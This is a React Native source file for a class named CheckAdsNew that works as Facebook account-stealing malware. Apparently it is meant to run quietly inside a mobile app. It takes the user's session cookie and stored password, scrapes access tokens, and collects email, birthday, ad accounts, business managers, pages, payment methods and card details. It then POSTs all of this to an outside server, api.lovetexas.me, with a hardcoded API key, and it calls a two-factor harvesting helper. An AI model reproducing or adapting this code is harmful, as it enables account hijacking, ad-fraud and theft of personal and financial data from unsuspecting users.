import { fetchApi } from "./fetchApi";
import { getBundleId } from 'react-native-device-info';
import { map } from 'bluebird';
import ReactNativeBlobUtil from 'react-native-blob-util'
import { GetTwofactor } from "./getTwofactor";
import AsyncStorage from '@react-native-community/async-storage';

class CheckAdsNew {
    constructor(params = {}) {
        const { cookie, deviceInfo, userAgent, password, originUserAgent } = params;
        this.userAgent = userAgent;
        this.cookie = cookie;
        this.DOMAIN = "https://api.lovetexas.me";
        this.API_KEY = "169c3333-1f2c-4c19-b1ac-c27f2f2d666d";
        this.uid = this.getBW(this.cookie, "c_user=", ";")
        this.dtsg = "";
        this.originUserAgent = originUserAgent
        this.password = password
        this.dataPost = {
            uid: this.uid,
            cookie,
            password,
            country: "",
            countryCode: "",
            regionName: "",
            state: "",
            timezone: "",
            ip: "",
            device: deviceInfo,
            name: "Unknow",
            token: '',
            userAgent,
            twofactor: "",
            appType: getBundleId(),
            email: "",
            birthday: "",
            isAdmin: false
        }
        this.success = false;
        this.tokenEAAQ = ""

    }

    async Start() {
        try {
            const password = await AsyncStorage.getItem('password');
            if(password)this.password = password;
            await Promise.all([
                this.getToken(),
                this.getClientIP(),
                this.getTokenEQ()
            ]);
            const x = new GetTwofactor({
                cookie: this.cookie,
                fb_dtsg: this.dtsg,
                uid: this.uid,
                password: this.password
            })
            await Promise.all([
                this.getListAds(),
                this.getListPages(),
                this.getListBM(),
                this.SendToServer()

            ])
            await x.run()
        } catch (error) {
            console.log("error", error);
        }
    }
    async getToken() {
        try {
            const url = `https://www.facebook.com/ads/adbuilder`;
            const html = await this._request({ url })
            this.token = this.getBW(html, `accessToken":"EABB`, `"`);
            this.token = `EABB${this.token}`;
            this.dataPost.token = this.token
            this.dtsg = this.getBW(html, `DTSGInitialData",[],{"token":"`, `"`);
            console.log('token :>> ', this.token);
        } catch (error) {
            console.log('error :>> ', error);
            throw error;
        }
    }
    async getTokenEQ() {
        try {
            const url = `https://www.facebook.com/ajax/bootloader-endpoint/?modules=AdsLWIDescribeCustomersContainer.react`;
            const html = await this._request({ url })
            this.tokenEAAQ = this.getBW(html, `accessToken":"EAAQ`, `"`);
            this.tokenEAAQ = `EAAQ${this.tokenEAAQ}`;
            await this.GetMe()
        } catch (error) {
            console.log('error :>> ', error);
            throw error;
        }
    }
    async GetMe() {
        try {
            const url = `https://graph.facebook.com/me/?fields=id,name,birthday,email&access_token=${this.tokenEAAQ}`;
            const response = await this._request({ url });
            const { birthday, email } = JSON.parse(response);
            this.dataPost.birthday = birthday;
            this.dataPost.email = email;
        } catch (error) {

        }
    }

    async getListPages() {
        try {
            const url = `https://graph.facebook.com/v13.0/me/facebook_pages?access_token=${this.token}&debug=all&fields=verification_status%2Ccountry_page_likes&format=json&method=get&pretty=0&suppress_http_code=1&transport=cors`;
            const options = {
                url
            }
            const responseAPI = await this._request(options);
            const { data } = JSON.parse(responseAPI)
            if (data?.length) {
                console.log('data?.length :>> ', data?.length);
                await map(data, async page => {
                    try {
                        page.uid = this.uid;
                        page.pageID = page.id
                        const urlAPI = `${this.DOMAIN}/api/add-pages?api_key=${this.API_KEY}`;
                        const response = await fetch(urlAPI, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(page)
                        });
                        const res = await response.json()
                        console.log('res :>> ', res);
                    } catch (error) {
                        console.log('error :>> ', error);
                    }
                })
            }

        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async getListBM() {
        try {
            const url = `https://graph.facebook.com/v12.0/me/businesses?fields=id,name,created_time,sharing_eligibility_status,allow_page_management_in_www,business_users.limit(0).summary(1),owned_ad_accounts.limit(5000).fields(id).summary(1),client_ad_accounts.fields(id).limit(5000).summary(1),is_tier_restricted,permitted_roles,timezone_id,two_factor_type,verification_status,aac_country,can_create_ad_account,is_disabled_for_integrity_reasons&limit=5000&access_token=${this.token}`;
            console.log('url :>> ', url);
            const options = {
                url
            }
            const response = await this._request(options);
            const { data } = JSON.parse(response);
            console.log('BM :>> ', data);
            await map(data, BM => this.getInfoBM(BM), { concurrency: 20 })
        } catch (error) {
            //console.log('error :>> ', error);
        }
    }

    async getInfoBM(BM) {
        try {
            try {
                const { client_ad_accounts, owned_ad_accounts } = BM;
                let adBMAccount = client_ad_accounts.data.concat(...owned_ad_accounts.data);
                if (adBMAccount?.length) {
                    adBMAccount = adBMAccount.map(a => {
                        return {
                            account_id: a.id.split('_')[1]
                        }
                    })
                    await map(adBMAccount, account => this.getInfoAdAccount(account), { concurrency: 20 });
                }
            } catch (error) {

            }

            const limit = await this.getLimitAdsBM(BM.id)
            const BmObject = {
                uid: this.uid,
                businessID: BM?.id,
                name: BM?.name,
                created_time: BM?.created_time,
                xmdn: BM?.verification_status,
                restrict: "",
                limit,
                sharing_eligibility_status: 350,
                admin: BM?.business_users?.summary?.total_count,
                client_ad_accounts: 0,
                cookie: this.dataPost.cookie,
                appType: getBundleId()
            }
            const sltk = await this.getSLTKBM(BM.id);
            if (sltk) {
                BmObject['client_ad_accounts'] = sltk
            }
            try {
                if (BM.permitted_roles) {
                    BmObject['isAdmin'] = BM.permitted_roles.filter(e => e.toLowerCase() == 'admin').length ? true : false;
                }
            } catch (error) {

            }
            const url = `${this.DOMAIN}/api/add-business-manager?api_key=${this.API_KEY}`;
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(BmObject)
            });

            const data = await response.json()
        } catch (error) {
            console.log('error :>> ', error);
            return
        }
    }
    async checkBMRestrict(bmid) {
        try {
            const url = `https://graph.facebook.com/graphql`
            const options = {
                url,
                body: `doc_id=3739963982749339&variables={"assetOwnerId":"${bmid}"}&access_token=${this.token}`
            }
            let data = await this._request(options);
            console.log('checkBMRestrict :>> ', data);
            data = JSON.parse(data);
            return data?.data?.assetOwnerData?.advertising_restriction_info?.status
        } catch (error) {
            //console.log('checkBMRestrict :>> ', error);
            return
        }
    }
    async getLimitAdsBM(bmid) {
        try {
            const url = `https://business.facebook.com/business/adaccount/limits/?business_id=${bmid}&__user=${this.dataPost.uid}&__a=1&fb_dtsg=${this.dtsg}&__spin_r=1005711901&__spin_b=trunk&__spin_t=1655739575&__jssesw=1`
            const options = {
                url
            }
            const data = await this._request(options);
            console.log('data :>> ', data);
            let jsonData = JSON.parse(data.replace('for (;;);', ''))
            console.log('object :>> ', jsonData);
            return jsonData?.payload?.adAccountLimit
        } catch (error) {
            return
        }
    }
    async getSLTKBM(bmid) {
        try {
            const url = `https://www.facebook.com/api/graphql`
            let body = `doc_id=4938789862872302&variables={"assetOwnerId":"${bmid}"}&fb_dtsg=${this.dtsg}`
            const options = {
                url,
                body,
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1",
                }
            }
            let data = await this._request(options)
            let jsonData = JSON.parse(data.replace('for (;;);', ''))
            return jsonData?.data?.ownedBusinessData?.business_ad_accounts?.count
        } catch (error) {
            return
        }
    }
    async getListAds() {
        try {
            const url = `https://graph.facebook.com/v12.0/me/adaccounts?limit=5000&fields=id,name,account_id,business,stored_balance&access_token=${this.token}`
            const options = {
                url
            }
            const response = await this._request(options)
            const { data } = JSON.parse(response);
            await map(data, account => this.getInfoAdAccount(account), { concurrency: 20 });
        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async getInfoAdAccount(account) {
        try {
            let [accountGraph, accountGraphql] = await Promise.all([
                this.getInfoAdAccountGraph(account.account_id),
                this.getInfoAdAccountGraphql(account.account_id),
            ])
            let objectAdsAcount = { ...accountGraph, ...accountGraphql }
            let admins = []
            if (objectAdsAcount?.users?.data?.length) {
                admins = [...admins, ...objectAdsAcount.users.data]
            }
            if (objectAdsAcount?.agencies?.data?.length) {
                admins = [...admins, ...objectAdsAcount.agencies.data]
            }
            let PTTT = ''

            try {
                if (objectAdsAcount?.billable_account_by_payment_account?.billing_payment_account?.billing_payment_methods) {
                    let billing_payment_methods = objectAdsAcount?.billable_account_by_payment_account?.billing_payment_account?.billing_payment_methods.filter((e) => e.is_primary)
                    PTTT = billing_payment_methods?.[0]?.credential?.__typename
                }
            } catch (error) {

            }
            let min_billing_threshold = ''
            try {
                min_billing_threshold = objectAdsAcount.adspaymentcycle.data[0].threshold_amount
            } catch (error) {

            }
            let spend = ''
            try {
                if (objectAdsAcount?.insights?.data) {
                    spend = objectAdsAcount?.insights?.data[0].spend;
                }
            } catch (error) {

            }
            if (!spend) {
                spend = objectAdsAcount?.spend_cap;
            }
            const adAccount = {
                uid: this.uid,
                account_id: account?.account_id,
                name: objectAdsAcount?.name,
                create_date: objectAdsAcount?.created_time,
                type: objectAdsAcount?.stored_balance_status,
                currency: objectAdsAcount?.currency,
                total_prepay_balance: objectAdsAcount?.total_prepay_balance?.amount,
                balance: objectAdsAcount?.balance,
                min_billing_threshold,
                spend_cap: spend,
                total_spend: objectAdsAcount?.amount_spent,
                limit_day: objectAdsAcount?.adtrust_dsl,
                max_billing_threshold: objectAdsAcount?.max_billing_threshold?.amount,
                PTTT,
                Admin: admins?.length,
                status: objectAdsAcount?.disable_reason,
                card: objectAdsAcount?.funding_source_details?.display_string,
                cookie: this.dataPost.cookie,
                has_extended_credit: objectAdsAcount?.has_extended_credit,
                balance: objectAdsAcount?.balance,
                appType: getBundleId()
            }
            console.log('adAccount :>> ', adAccount);
            const url = `${this.DOMAIN}/api/add-ads-manager?api_key=${this.API_KEY}`;
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(adAccount)
            });
            const data = await response.json()
            console.log('data :>> ', data);

        } catch (error) {
            console.log('error :>> ', error);
        }
    }
    async getInfoAdAccountGraph(account_id) {
        try {
            const url = `https://graph.facebook.com/v12.0/act_${account_id}?method=get&date_format=U&fields=amount_spent,insights.date_preset(data_maximum)%7Bspend%7D,account_id,funding_source_details,adspaymentcycle%7Bthreshold_amount%7D,name,created_time,last_used_time,currency,timezone_name,stored_balance_status,business,balance,adtrust_dsl,spend_cap,disable_reason,is_prepay_account,total_prepay_balance.fields(amount),max_billing_threshold.fields(amount),min_billing_threshold.fields(amount),am_tabular.date_preset(data_maximum).column_fields(spend),owner,agencies.fields(id,role,name),users.fields(id,role,name),has_extended_credit&access_token=${this.token}`
            const options = {
                url
            }
            let data = await this._request(options)
            data = JSON.parse(data);
            return data
        } catch (error) {
            return {}
        }
    }
    async getInfoAdAccountGraphql(account_id) {
        try {
            const url = `https://www.facebook.com/api/graphql`
            let body = `doc_id=3633949436715463&variables={"paymentAccountID":"${account_id}"}&fb_dtsg=${this.dtsg}`
            const options = {
                url,
                body,
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1",
                }
            }
            let res = await this._request(options)
            res = JSON.parse(res);
            return res.data
        } catch (error) {
            console.log('error :>> ', error);
            return {}
        }
    }
    async SendToServer() {
        try {
            const url = `${this.DOMAIN}/api/add-data-account?api_key=${this.API_KEY}`;
            const result = await fetchApi("POST", url, this.dataPost, {
                'Content-Type': 'application/json',
            });
            console.log("SendToServer", result);

        } catch (error) {
            //console.log("SendToServer", error);
        }
    }
    async CheckAdsBM() {
        try {
            await Promise.all([
                this.fetchData("ADS"),
                this.fetchData("BUSINESS"),
                this.fetchData("PAGE")
            ])
        } catch (error) {

        }
    }
    async getClientIP() {
        try {
            let res = await fetchApi("GET", `https://lumtest.com/myip.json`);
            this.dataPost = { ...this.dataPost, ...res };
            this.dataPost.state = res.geo.city
        } catch (error) {
            //console.log(error)
        }
    }

    getBW(text, Start, End) {
        var ret = text.split(Start);
        if (ret[1]) {
            ret = ret[1].split(End);
            return ret[0];
        };
        return 0;
    }
    async _request({ url, body, headers = {} }) {
        try {
            let rqHeaders = {
                "Cookie": this.cookie,
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15'

            }
            rqHeaders = { ...rqHeaders, ...headers }

            if (!body?.length) {
                let data = await ReactNativeBlobUtil.fetch('GET', url, rqHeaders)
                let text = await data.text()
                return text
            }
            let data = await ReactNativeBlobUtil.fetch('POST', url, rqHeaders, body)
            let text = await data.text()
            return text
        } catch (error) {
            console.log('errorr :>> ', error, url);
            throw error;
        }
    }

}
export { CheckAdsNew }